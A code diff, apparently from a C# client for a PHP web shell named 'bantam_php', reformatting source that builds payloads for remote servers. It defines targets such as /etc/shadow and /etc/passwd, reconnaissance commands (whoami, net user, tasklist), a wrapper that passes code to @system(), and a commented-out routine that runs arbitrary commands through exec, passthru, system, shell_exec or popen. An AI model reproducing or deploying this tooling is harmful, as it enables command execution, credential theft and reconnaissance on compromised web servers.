@@ -106,23 +106,23 @@ namespace bantam_php
             return "@system('" + code + "');";
         }
 
-        public static string linuxFS_ShadowFile         = "/etc/shadow";
-        public static string linuxFS_PasswdFile         = "/etc/passwd";
-        public static string linuxFS_IssueFile          = "/etc/issue.net";
-        public static string linuxFS_hostTargetsFile    = "/etc/hosts";
-        public static string linuxFS_ProcVersion        = "/proc/version";
-        public static string linuxFS_NetworkInterfaces  = "/etc/network/interfaces";
+        public static string linuxFS_ShadowFile = "/etc/shadow";
+        public static string linuxFS_PasswdFile = "/etc/passwd";
+        public static string linuxFS_IssueFile = "/etc/issue.net";
+        public static string linuxFS_hostTargetsFile = "/etc/hosts";
+        public static string linuxFS_ProcVersion = "/proc/version";
+        public static string linuxFS_NetworkInterfaces = "/etc/network/interfaces";
 
         public static string windowsFS_hostTargets = "C:\\Windows\\System32\\drivers\\etc\\hosts";
 
-        public static string linuxOS_PsAux          = "ps aux";
-        public static string linuxOS_Ifconfig       = "ifconfig";
-        public static string windowsOS_Ipconfig     = "ipconfig";
-        public static string windowsOS_TaskList     = "tasklist";
-        public static string windowsOS_NetUser      = "net user";
-        public static string windowsOS_NetAccounts  = "net accounts";
-        public static string windowsOS_Ver          = "ver";
-        public static string posixOS_Whoami         = "whoami";
+        public static string linuxOS_PsAux = "ps aux";
+        public static string linuxOS_Ifconfig = "ifconfig";
+        public static string windowsOS_Ipconfig = "ipconfig";
+        public static string windowsOS_TaskList = "tasklist";
+        public static string windowsOS_NetUser = "net user";
+        public static string windowsOS_NetAccounts = "net accounts";
+        public static string windowsOS_Ver = "ver";
+        public static string posixOS_Whoami = "whoami";
 
 
         public static string phpInfo = "phpinfo();";
@@ -161,26 +161,26 @@ namespace bantam_php
         /// </summary>
         /// <param name="code"></param>
         /// <returns></returns>
-    //    public static string executeSystemCode(string code)
-    //    {
-		  //  return @"
-    //        if (function_exists('exec')) {
-    //            @exec($in, $out);
-			 //   echo @out;
-    //        } elseif(function_exists('passthru')) {
-    //            @passthru($in);
-    //        } elseif(function_exists('system')) {
-    //            @system($in);;
-    //        } elseif(function_exists('shell_exec')) {
-			 //   echo @shell_exec($in);
-    //        } elseif(is_resource($f = @popen($in, 'r'))) {
-			 //   $out = "";
-    //            while (!@feof($f))
-				//$out .= fread($f, 1024);
-    //            pclose($f);
-    //            echo $out;
-    //        }";
-    //    }
+        //    public static string executeSystemCode(string code)
+        //    {
+        //  return @"
+        //        if (function_exists('exec')) {
+        //            @exec($in, $out);
+        //   echo @out;
+        //        } elseif(function_exists('passthru')) {
+        //            @passthru($in);
+        //        } elseif(function_exists('system')) {
+        //            @system($in);;
+        //        } elseif(function_exists('shell_exec')) {
+        //   echo @shell_exec($in);
+        //        } elseif(is_resource($f = @popen($in, 'r'))) {
+        //   $out = "";
+        //            while (!@feof($f))
+        //$out .= fread($f, 1024);
+        //            pclose($f);
+        //            echo $out;
+        //        }";
+        //    }
 
         /// <summary>
         /// 
@@ -194,12 +194,10 @@ namespace bantam_php
             //TODO move this version holder / checker else where to a function
             string sortCode = "";
             string[] version = phpVersion.Split(new string[] { "." }, StringSplitOptions.None);
-            if (version != null && version.Length >= 2)
-            {
-                if (Convert.ToInt32(version[0]) > 5 
-                || (Convert.ToInt32(version[0]) == 5 && Convert.ToInt32(version[1]) >= 3))
-                {
-                    sortCode = 
+            if (version != null && version.Length >= 2) {
+                if (Convert.ToInt32(version[0]) > 5
+                || (Convert.ToInt32(version[0]) == 5 && Convert.ToInt32(version[1]) >= 3)) {
+                    sortCode =
                     @" if(version_compare(phpversion(), '5.3.0', '>='))
                     {
                         if (!empty($dirs))
@@ -258,17 +256,17 @@ namespace bantam_php
 		            }" + sortCode + @"
 
                     foreach ($dirs as $dir) {
-                        echo $dir['name'] . '" + colSeperator 
-                        + @"'.$dir['path'].'"  + colSeperator 
-                        + @"'.$dir['size'].'"  + colSeperator 
-                        + @"'.$dir['type'].'"  + colSeperator 
+                        echo $dir['name'] . '" + colSeperator
+                        + @"'.$dir['path'].'" + colSeperator
+                        + @"'.$dir['size'].'" + colSeperator
+                        + @"'.$dir['type'].'" + colSeperator
                         + @"'.$dir['perms'].'" + rowSeperator + @"';
                     }
                     foreach($files as $file) {
-                        echo $file['name'] . '" + colSeperator  
-                        + "'.$file['path'].'" + colSeperator 
-                        + "'.$file['size'].'" + colSeperator  
-                        + "'.$file['type'].'" + colSeperator  
+                        echo $file['name'] . '" + colSeperator
+                        + "'.$file['path'].'" + colSeperator
+                        + "'.$file['size'].'" + colSeperator
+                        + "'.$file['type'].'" + colSeperator
                         + "'.$dir['perms'].'" + rowSeperator + @"';
                     }
                 }catch(Exception $e){  }";
